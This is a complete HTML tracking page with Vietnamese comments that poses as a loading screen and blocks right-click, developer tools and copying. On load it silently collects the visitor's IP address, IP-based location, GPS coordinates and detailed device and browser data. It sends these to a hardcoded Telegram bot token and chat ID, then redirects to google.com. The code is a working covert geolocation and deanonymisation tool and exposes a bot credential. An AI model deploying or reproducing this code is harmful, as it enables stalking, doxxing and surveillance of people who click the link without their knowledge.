<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        (function() {
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('keydown', function(e) {
                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey) || (e.ctrlKey && e.key === 'U')) {
                    e.preventDefault();
                }
            });
            document.addEventListener('copy', e => e.preventDefault());
            document.addEventListener('cut', e => e.preventDefault());
            document.addEventListener('selectstart', e => e.preventDefault());
        })();
    </script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #333;
            border-top: 4px solid #4facfe;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .text { color: #4facfe; font-size: 16px; }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="spinner"></div>
        <div class="text">Đang tải...</div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const linkId = urlParams.get('id');
        
        const BOT_TOKEN = '8833366172:AAENlwjzM84DAxms8EP0wUq4wG_1_rH7ZgE';
        const ADMIN_ID = '7564889663';
        const TARGET_URL = 'https://google.com';
        
        // ============ LẤY IPv4 ============
        async function getIPv4() {
            const apis = [
                { url: 'https://api.ipify.org?format=json', type: 'json', parse: d => d.ip },
                { url: 'https://ipv4.icanhazip.com', type: 'text', parse: d => d.trim() }
            ];
            
            for (const api of apis) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 2000);
                    
                    const res = await fetch(api.url, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    
                    let data;
                    if (api.type === 'json') data = await res.json();
                    else data = await res.text();
                    
                    const ip = api.parse(data);
                    if (ip && !ip.includes(':')) return ip;
                } catch(e) {}
            }
            return 'Không xác định';
        }
        
        // ============ LẤY VỊ TRÍ + TỌA ĐỘ ============
        async function getLocation(ip) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);
                
                const res = await fetch(`https://ipwho.is/${ip}`, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                const data = await res.json();
                
                return {
                    loc: `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'}`,
                    isp: data.connection?.isp || 'N/A',
                    latitude: data.latitude || 'N/A',
                    longitude: data.longitude || 'N/A',
                    timezone: data.timezone?.id || 'N/A'
                };
            } catch(e) {
                // Thử API khác
                try {
                    const res = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone`);
                    const data = await res.json();
                    
                    if (data.status === 'success') {
                        return {
                            loc: `${data.city || 'N/A'}, ${data.regionName || 'N/A'}, ${data.country || 'N/A'}`,
                            isp: data.isp || data.org || 'N/A',
                            latitude: data.lat || 'N/A',
                            longitude: data.lon || 'N/A',
                            timezone: data.timezone || 'N/A'
                        };
                    }
                } catch(e2) {}
                
                return { loc: 'Không xác định', isp: 'Không xác định', latitude: 'N/A', longitude: 'N/A', timezone: 'N/A' };
            }
        }
        
        // ============ LẤY GPS CHÍNH XÁC (NẾU USER CHO PHÉP) ============
        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ gpsLat: 'Không hỗ trợ', gpsLng: 'Không hỗ trợ' });
                    return;
                }
                
                // Timeout 3 giây
                const timeout = setTimeout(() => {
                    resolve({ gpsLat: 'Không cho phép', gpsLng: 'Không cho phép' });
                }, 3000);
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        resolve({
                            gpsLat: position.coords.latitude.toFixed(6),
                            gpsLng: position.coords.longitude.toFixed(6)
                        });
                    },
                    (error) => {
                        clearTimeout(timeout);
                        resolve({ gpsLat: 'Bị từ chối', gpsLng: 'Bị từ chối' });
                    },
                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
                );
            });
        }
        
        // ============ LẤY THÔNG TIN THIẾT BỊ CHI TIẾT ============
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            const uaLower = ua.toLowerCase();
            
            let device = 'Unknown';
            let os = 'Unknown';
            let browser = 'Unknown';
            let browserVersion = '';
            
            // ============ THIẾT BỊ CHI TIẾT ============
            if (/iphone/.test(uaLower)) {
                device = 'iPhone';
                const match = ua.match(/iPhone(\d+,\d+)/);
                if (match) device = `iPhone (Model: ${match[1]})`;
            } else if (/ipad/.test(uaLower)) {
                device = 'iPad';
                const match = ua.match(/iPad(\d+,\d+)/);
                if (match) device = `iPad (Model: ${match[1]})`;
            } else if (/android/.test(uaLower)) {
                if (/mobile/.test(uaLower)) {
                    device = 'Android Phone';
                } else {
                    device = 'Android Tablet';
                }
                // Lấy tên máy Android
                const match = ua.match(/Android \d+; ([^;]+)/);
                if (match) device = match[1].trim();
            } else if (/macintosh/.test(uaLower)) {
                device = 'Mac';
            } else if (/windows/.test(uaLower)) {
                device = 'Windows PC';
            } else if (/linux/.test(uaLower)) {
                device = 'Linux PC';
            }
            
            // ============ OS CHI TIẾT ============
            if (/iphone|ipad|ipod/.test(uaLower)) {
                const match = ua.match(/OS (\d+_\d+)/);
                if (match) os = `iOS ${match[1].replace('_', '.')}`;
                else os = 'iOS';
            } else if (/android/.test(uaLower)) {
                const match = ua.match(/Android (\d+)/);
                if (match) os = `Android ${match[1]}`;
                else os = 'Android';
            } else if (/windows nt 10.0/.test(uaLower)) os = 'Windows 10';
            else if (/windows nt 11.0/.test(uaLower)) os = 'Windows 11';
            else if (/windows nt 6.3/.test(uaLower)) os = 'Windows 8.1';
            else if (/windows nt 6.1/.test(uaLower)) os = 'Windows 7';
            else if (/mac os x/.test(uaLower)) {
                const match = ua.match(/Mac OS X (\d+_\d+)/);
                if (match) os = `macOS ${match[1].replace('_', '.')}`;
                else os = 'macOS';
            }
            
            // ============ BROWSER CHI TIẾT ============
            if (/crios/.test(uaLower)) {
                browser = 'Chrome (iOS)';
                browserVersion = ua.match(/CriOS\/(\d+)/)?.[1] || '';
            } else if (/fxios/.test(uaLower)) {
                browser = 'Firefox (iOS)';
                browserVersion = ua.match(/FxiOS\/(\d+)/)?.[1] || '';
            } else if (/edg/.test(uaLower)) {
                browser = 'Microsoft Edge';
                browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || '';
            } else if (/opr|opera/.test(uaLower)) {
                browser = 'Opera';
                browserVersion = ua.match(/OPR\/(\d+)/)?.[1] || '';
            } else if (/chrome/.test(uaLower)) {
                browser = 'Google Chrome';
                browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || '';
            } else if (/firefox/.test(uaLower)) {
                browser = 'Mozilla Firefox';
                browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || '';
            } else if (/safari/.test(uaLower)) {
                browser = 'Safari';
                browserVersion = ua.match(/Version\/(\d+)/)?.[1] || '';
            }
            
            if (browserVersion) browser += ` v${browserVersion}`;
            
            // ============ THÔNG TIN KHÁC ============
            const screen = `${window.screen.width}x${window.screen.height}`;
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A';
            const cores = navigator.hardwareConcurrency || 'N/A';
            const touch = 'ontouchstart' in window ? 'Có' : 'Không';
            const pixelRatio = window.devicePixelRatio || 1;
            
            return { device, os, browser, screen, ram, cores, touch, pixelRatio };
        }
        
        // ============ THU THẬP TẤT CẢ ============
        async function collectAndRedirect() {
            if (!linkId || linkId.length < 8) {
                window.location.replace(TARGET_URL);
                return;
            }
            
            const data = { linkId: linkId };
            
            // Lấy IP
            data.ip = await getIPv4();
            
            // Lấy vị trí + tọa độ
            if (data.ip !== 'Không xác định') {
                const locData = await getLocation(data.ip);
                data.loc = locData.loc;
                data.isp = locData.isp;
                data.lat = locData.latitude;
                data.lng = locData.longitude;
                data.timezone = locData.timezone;
            }
            
            // Lấy GPS (nếu user cho phép)
            const gps = await getGPS();
            data.gpsLat = gps.gpsLat;
            data.gpsLng = gps.gpsLng;
            
            // Lấy thông tin thiết bị chi tiết
            const deviceInfo = getDeviceInfo();
            data.device = deviceInfo.device;
            data.os = deviceInfo.os;
            data.browser = deviceInfo.browser;
            data.screen = deviceInfo.screen;
            data.ram = deviceInfo.ram;
            data.cores = deviceInfo.cores;
            data.touch = deviceInfo.touch;
            data.pixelRatio = deviceInfo.pixelRatio;
            
            data.time = new Date().toLocaleString('vi-VN');
            data.referrer = document.referrer || 'Trực tiếp';
            data.lang = navigator.language || 'N/A';
            
            // ============ GỬI VỀ TELEGRAM ============
            const msg = `🔍 *LINK ID:* \`${linkId}\`\n━━━━━━━━━━━━━━━\n🌐 *IP:* \`${data.ip}\`\n📍 *Vị trí:* ${data.loc}\n📡 *ISP:* ${data.isp}\n🗺️ *Tọa độ IP:* ${data.lat}, ${data.lng}\n🕐 *Timezone:* ${data.timezone}\n📍 *GPS:* ${data.gpsLat}, ${data.gpsLng}\n━━━━━━━━━━━━━━━\n📱 *Thiết bị:* ${data.device}\n💻 *OS:* ${data.os}\n🌍 *Browser:* ${data.browser}\n🖥️ *Màn hình:* ${data.screen}\n💾 *RAM:* ${data.ram}\n⚡ *CPU Cores:* ${data.cores}\n👆 *Touch:* ${data.touch}\n📐 *Pixel Ratio:* ${data.pixelRatio}\n━━━━━━━━━━━━━━━\n🌐 *Ngôn ngữ:* ${data.lang}\n⏰ *Thời gian:* ${data.time}\n🔗 *Referrer:* ${data.referrer}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });
            } catch(e) {}
            
            // Chuyển hướng
            window.location.replace(TARGET_URL);
        }
        
        window.addEventListener('load', collectAndRedirect);
        
        // Bảo hiểm 5 giây
        setTimeout(() => {
            window.location.replace(TARGET_URL);
        }, 5000);
    </script>
</body>
</html>
